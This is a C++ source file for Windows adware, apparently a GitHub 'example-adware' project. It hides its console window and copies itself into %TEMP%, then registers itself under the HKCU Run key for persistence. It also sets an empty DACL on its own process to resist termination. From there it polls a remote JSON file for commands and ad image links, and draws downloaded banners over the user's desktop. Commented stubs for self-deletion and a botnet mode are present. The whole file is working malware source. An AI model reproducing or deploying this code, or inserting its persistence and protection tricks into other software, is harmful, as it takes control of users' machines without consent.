#pragma warning(disable : 4996)

#include <windows.h>
#include <iostream>
#include <fstream>
#include <thread>
#include <string>
#include <random>
#include <vector>
#include "aclapi.h"
#include <winternl.h>
#include <curl/curl.h>
#include <nlohmann/json.hpp>

using namespace std;
using json = nlohmann::json;

BITMAP bm;
int x2;
int y2;
int pos = 0;
bool status = false;
bool ads = false;
int mtime = 60;

string fileName = "banner.bmp";
string data0 = "https://raw.githubusercontent.com/trowx/example-adware/main/example.json";

int wpos = 1;

string link0;
int duration0;

string link1;
int duration1;

string link2;
int duration2;

string link3;
int duration3;

string tmp;
string path;
string dir;
string bName;

enum class sPosition {
	bottom_right,
	top_center,
	bottom_left,
	center
};

size_t WriteCallback(char* contents, size_t size, size_t nmemb, void* userp)
{
	((std::string*)userp)->append((char*)contents, size * nmemb);
	return size * nmemb;
}

string getData() {
	curl_global_init(CURL_GLOBAL_ALL);

	CURL* easyhandle = curl_easy_init();
	CURLcode res;

	std::string readBuffer;

	if (easyhandle) {
		curl_easy_setopt(easyhandle, CURLOPT_URL, data0.c_str());
		curl_easy_setopt(easyhandle, CURLOPT_VERBOSE, 0L);
		curl_easy_setopt(easyhandle, CURLOPT_WRITEFUNCTION, WriteCallback);
		curl_easy_setopt(easyhandle, CURLOPT_WRITEDATA, &readBuffer);

		res = curl_easy_perform(easyhandle);
		curl_easy_cleanup(easyhandle);

		if (res != CURLE_OK) {
			return "ERROR";
		}
	}

	return readBuffer;
}

size_t write_data(void* ptr, size_t size, size_t nmemb, FILE* stream) {
	size_t written = fwrite(ptr, size, nmemb, stream);
	return written;
}

wstring stringToLPCWSTR(string d) {
	wstring stemp = wstring(d.begin(), d.end());
	return stemp.c_str();
}

inline bool exist(const string& name)
{
	return GetFileAttributes(stringToLPCWSTR(name).c_str()) != INVALID_FILE_ATTRIBUTES;
}

bool downloadFile(string url, const char* fName) {
	CURL* curl;
	FILE* fp;
	CURLcode res;
	curl = curl_easy_init();
	if (curl) {
		fp = fopen(fName, "wb");
		curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
		curl_easy_setopt(curl, CURLOPT_VERBOSE, 0L);
		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
		curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
		res = curl_easy_perform(curl);
		/* always cleanup */
		curl_easy_cleanup(curl);
		fclose(fp);
		if (res != CURLE_OK) {
			return false;
		}
	}
	return true;
}

HDC setImage() {
	HBITMAP cross = (HBITMAP)LoadImage(NULL, stringToLPCWSTR(fileName).c_str(), IMAGE_BITMAP,
		0, 0, LR_LOADFROMFILE);

	if (!cross)
		return 0;

	GetObject((HGDIOBJ)cross, sizeof(bm), &bm);
	HDC hdc = CreateCompatibleDC(NULL);

	SelectObject(hdc, cross);

	if (pos == 0) {
		//botton right
		x2 = GetSystemMetrics(SM_CXSCREEN) - bm.bmWidth;
		y2 = GetSystemMetrics(SM_CYSCREEN) - bm.bmHeight;

		RECT rect;
		HWND taskBar = FindWindow(L"Shell_traywnd", NULL);
		if (taskBar && GetWindowRect(taskBar, &rect)) {
			y2 = y2 - (rect.bottom - rect.top);
		}
	}
	else if (pos == 1) {
		//top center
		HWND   hwndScreen;
		RECT   rectScreen;
		hwndScreen = GetDesktopWindow();
		GetWindowRect(hwndScreen, &rectScreen);

		x2 = (GetSystemMetrics(SM_CXSCREEN) - bm.bmWidth) / 2;
		y2 = GetSystemMetrics(SM_CYSCREEN) - rectScreen.bottom;
	}
	else if (pos == 2) {
		//bottom left
		x2 = 0;
		y2 = GetSystemMetrics(SM_CYSCREEN) - bm.bmHeight;

		RECT rect;
		HWND taskBar = FindWindow(L"Shell_traywnd", NULL);
		if (taskBar && GetWindowRect(taskBar, &rect)) {
			y2 = y2 - (rect.bottom - rect.top);
		}
	}
	else if (pos == 3) {
		//center
		x2 = (GetSystemMetrics(SM_CXSCREEN) - bm.bmWidth) / 2;
		y2 = (GetSystemMetrics(SM_CYSCREEN) - bm.bmHeight) / 2;
	}

	return hdc;
}

void showADS() {
	HDC hdc = setImage();
	while (status)
	{
		if (hdc != 0 && status) {
			//SHOW BITMAP
			HDC hdc_x = GetDC(HWND_DESKTOP);
			BitBlt(hdc_x, x2, y2, bm.bmWidth, bm.bmHeight, hdc, 0, 0, SRCCOPY | LR_LOADFROMFILE);
			ReleaseDC(HWND_DESKTOP, hdc_x);
			DeleteDC(hdc_x);
		}
	}
}

void task2()
{
	while (true) {
		if (ads) {
			ads = false;
			showADS();
		}
		else { Sleep(500); }
	}
}

void selectPosition(sPosition enumPosition) {
	switch (enumPosition) {
	case sPosition::bottom_right:
		//bottom-right
		if (link0 != "0") {
			fileName = "bottom_right.bmp";
			bool res = downloadFile(link0, fileName.c_str());
			if (res) {
				status = true;
				pos = 0;
				ads = true;

				Sleep(1000 * duration0);
				status = false;
			}
		}
		break;
	case sPosition::bottom_left:
		//bottom-left
		if (link2 != "2") {
			fileName = "bottom_left.bmp";
			bool res = downloadFile(link2, fileName.c_str());
			if (res) {
				status = true;
				pos = 2;
				ads = true;

				Sleep(1000 * duration2);
				status = false;
			}
		}
		break;
	case sPosition::center:
		//center
		if (link3 != "3") {
			fileName = "center.bmp";
			bool res = downloadFile(link3, fileName.c_str());
			if (res) {
				status = true;
				pos = 3;
				ads = true;

				Sleep(1000 * duration3);
				status = false;
			}
		}
		break;
	case sPosition::top_center:
		//top-center
		if (link1 != "1") {
			fileName = "top_center.bmp";
			bool res = downloadFile(link1, fileName.c_str());
			if (res) {
				status = true;
				pos = 1;
				ads = true;

				Sleep(1000 * duration1);
				status = false;
			}
		}
		break;
	default:
		break;
	}
}

void selectPositionOffline(sPosition enumPosition) {
	switch (enumPosition) {
	case sPosition::bottom_right:
		//bottom-right
		if (exist("bottom_right.bmp")) {
			fileName = "bottom_right.bmp";

			status = true;
			pos = 0;
			ads = true;

			Sleep(1000 * mtime);
			status = false;
		}
		break;
	case sPosition::bottom_left:
		//bottom-left
		if (exist("bottom_left.bmp")) {
			fileName = "bottom_left.bmp";

			status = true;
			pos = 2;
			ads = true;

			Sleep(1000 * mtime);
			status = false;
		}
		break;
	case sPosition::center:
		//center
		if (exist("center.bmp")) {
			fileName = "center.bmp";

			status = true;
			pos = 3;
			ads = true;

			Sleep(1000 * mtime);
			status = false;
		}
		break;
	case sPosition::top_center:
		//top-center
		if (exist("top_center.bmp")) {
			fileName = "top_center.bmp";

			status = true;
			pos = 1;
			ads = true;

			Sleep(1000 * mtime);
			status = false;
		}
		break;
	default:
		break;
	}
}

int chooseRandom() {
	const vector<int> intList{ 5, 10, 15, 20 };

	random_device rd;
	mt19937 eng(rd());
	uniform_int_distribution<> distr(0, intList.size() - 1);

	return intList[distr(eng)];
}

void work(int stt) {
	if (stt == 2) {
	    //delMySelf();
	    //exit(0);
	}
	else if (stt == 4) {
		//runBotnet();
	}
	else if (stt == 6) {
		//do something
	}
}

void task1()
{
	while (true)
	{
		string textData = getData();
		if (textData != "ERROR") {
			//parse json
			json jsonData = json::parse(textData);

			link0 = jsonData["rules"]["links"][3]["bottom_right"];
			duration0 = jsonData["rules"]["links"][3]["duration"].get<int>();

			link1 = jsonData["rules"]["links"][0]["top_center"];
			duration1 = jsonData["rules"]["links"][0]["duration"].get<int>();

			link2 = jsonData["rules"]["links"][1]["center"];
			duration2 = jsonData["rules"]["links"][1]["duration"].get<int>();

			link3 = jsonData["rules"]["links"][2]["bottom_left"];
			duration3 = jsonData["rules"]["links"][2]["duration"].get<int>();

		    work(jsonData["rules"]["status"].get<int>());

			//select random position for ads
			int wpos0 = chooseRandom();
			if (wpos0 == wpos) {
				while (1) {
					wpos0 = chooseRandom();
					if (wpos != wpos0) {
						wpos = wpos0;
						break;
					}
				}
			}
			wpos = wpos0;

			if (wpos0 == 5) {
				selectPosition(sPosition::bottom_right);
			}
			else if (wpos0 == 10) {
				selectPosition(sPosition::bottom_left);
			}
			else if (wpos0 == 15) {
				selectPosition(sPosition::center);
			}
			else if (wpos0 == 20) {
				selectPosition(sPosition::top_center);
			}

			Sleep(1000 * (60 * ((wpos0/5) + 2)));
		}
		else {
			//if internet connection closed...
			int wpos0 = chooseRandom();
			if (wpos0 == 5) {
				selectPositionOffline(sPosition::bottom_right);
			}
			else if (wpos0 == 10) {
				selectPositionOffline(sPosition::bottom_left);
			}
			else if (wpos0 == 15) {
				selectPositionOffline(sPosition::center);
			}
			else if (wpos0 == 20) {
				selectPositionOffline(sPosition::top_center);
			}

			Sleep(1000 * (60 * ((wpos0 / 5) + 2)));
		}
		Sleep(500);
	}
}

string base_name(string const& path)
{
	return path.substr(path.find_last_of("/\\") + 1);
}

string getPath() {
	HMODULE this_process_handle = GetModuleHandle(NULL);
	wchar_t this_process_path[MAX_PATH];
	GetModuleFileNameW(NULL, this_process_path, sizeof(this_process_path));

	wstring ws(this_process_path);
	string str(ws.begin(), ws.end());
	return str;
}

string getDirectory(const string& path1)
{
	size_t found = path1.find_last_of("/\\");
	return(path1.substr(0, found));
}

void copyFile(string src0, string dst0) {
	ifstream  src(src0, ios::binary);
	ofstream  dst(dst0, ios::binary);
	dst << src.rdbuf();
}

void addStartup(bool sta) {
	//full path
	TCHAR szPath[MAX_PATH];
	GetModuleFileName(NULL, szPath, MAX_PATH);

	//string to wstring
	wstring wsTmp(bName.begin(), bName.end());

	HKEY newValue;
	RegOpenKey(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", &newValue);
	if (sta) {
		RegSetValueEx(newValue, wsTmp.c_str(), 0, REG_SZ, (LPBYTE)szPath, sizeof(szPath));
	}
	else {
		RegDeleteValue(newValue, wsTmp.c_str());
	}
	RegCloseKey(newValue);
}

DWORD ProtectProcess(void)
{
	HANDLE hProcess = GetCurrentProcess();
	PACL pEmptyDacl;
	DWORD dwErr;

	// using malloc guarantees proper alignment
	pEmptyDacl = (PACL)malloc(sizeof(ACL));

	if (!InitializeAcl(pEmptyDacl, sizeof(ACL), ACL_REVISION))
	{
		dwErr = GetLastError();
	}
	else
	{
		dwErr = SetSecurityInfo(hProcess, SE_KERNEL_OBJECT,
			DACL_SECURITY_INFORMATION, NULL, NULL, pEmptyDacl, NULL);
	}

	free(pEmptyDacl);
	return dwErr;
}

void init() {
	path = getPath();
	tmp = getenv("TEMP");
	dir = getDirectory(path);
	bName = base_name(path);

	if (tmp == dir) {
		addStartup(true);
	}
	else {
		copyFile(path, tmp + "\\" + bName);
		system(("start /D " + tmp + " " + tmp + "\\" + bName).c_str());
		exit(0);
	}
}

int main()
{
	//hide console
	ShowWindow(GetConsoleWindow(), SW_HIDE);

	init();

	ProtectProcess();

	//disable debug error messagebox
	_set_error_mode(_OUT_TO_STDERR);
	_CrtSetReportMode(_CRT_ERROR, _CRTDBG_MODE_DEBUG);
	assert(false);

	//random number for sleep
	Sleep(1000 * (60 * chooseRandom()));

	//start threads
	thread t2(task2);
	thread t1(task1);
	t1.join();
	t2.join();
}
